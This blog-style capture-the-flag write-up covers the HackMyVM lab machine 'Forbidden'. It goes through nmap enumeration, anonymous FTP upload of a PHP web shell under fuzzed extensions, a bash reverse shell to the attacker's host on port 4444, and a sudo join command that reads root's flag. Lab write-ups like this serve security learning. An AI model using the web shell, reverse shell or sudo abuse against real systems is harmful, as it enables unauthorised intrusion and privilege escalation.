---
layout: post
author: maxin
title:  "Forbidden"
date:   2022-01-01 09:37:31 PM -03
category: HackMyVM
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Forbidden)

# Enumeration

{% highlight text  %}
# Nmap 7.92 scan initiated Wed Dec 29 15:11:02 2021 as: nmap -sC -sV -v -oN nmap 192.168.0.162
Nmap scan report for 192.168.0.162
Host is up (0.017s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Oct 09  2020 www [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.216
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Unix

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 29 15:11:10 2021 -- 1 IP address (1 host up) scanned in 7.46 seconds
{% endhighlight  %}

# Port 80

On index.html we can see a message

{% highlight text  %}
SECURE WEB/FTP
Hi, Im the best admin of the world. You cannot execute .php code on this server 
so you cannot obtain a reverse shell. 
Not sure if its misconfigured another things... but the importart is that php is disabled. 
-marta
{% endhighlight  %}

This webserver has 3 file.  You can see those files connecting on FTP

- index.html
- notes.txt → A message saying about a password on a .jpg file
- robots.txt

# Port 21

Using default creds `anonymous` with a blank password

We can see the `www` directory it’s the same on webserver directory. We can try to upload some files

# Reverse shell

We can’t upload a php file, because the webserver disabled, but we can try to upload different versions of it 

First we need to create a wordlist with the extensions

{% highlight bash  %}
cat /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-extensions-lowercase.txt| grep "^.php" > extensions
{% endhighlight  %}

![Untitled](/images/forbidden/phpFiles.png)

Second we need to create a directory to storage all the files with the extensions

We need to create a directory ‘cause we’ll send all this files to FTP server

{% highlight bash  %}
mkdir files; cd files
for i in $(cat ../extensions); do touch "file$i"; done 
{% endhighlight  %}

{% highlight bash  %}
echo "<?php system(\$_GET['cmd']); ?>" > * #Send this payload to all files
{% endhighlight  %}

Connect to the FTP server and upload all the files

{% highlight bash  %}
mput *
{% endhighlight  %}

## Fuzzing

Using the wordlist created to fuzzing

{% highlight bash  %}
wfuzz -w extensions.dic -c -u "http://192.168.0.162/fileFUZZ" --hw 3

00000003:   200   0 L     0 W     0 Ch    ".php5"
{% endhighlight  %}

Use burp to make a reverse shell

{% highlight bash  %}
bash -c "bash -i >& /dev/tcp/192.168.0.216/4444 0>&1"
{% endhighlight  %}

![Untitled](/images/forbidden/reverseShell.png)

# User

On `marta’s` home directory has a hidden file, called .forbidden. We can execute this file and become `markos` user

# Root

On /var/www/html has a file called TOPSECRETIMAGE.jpg

Marta’s password is: TOPSECRETIMAGE

{% highlight bash  %}
sudo -l #Has marta

User marta may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/join
{% endhighlight  %}

{% highlight bash  %}
sudo join -a 2 /dev/null /root/root.txt
{% endhighlight  %}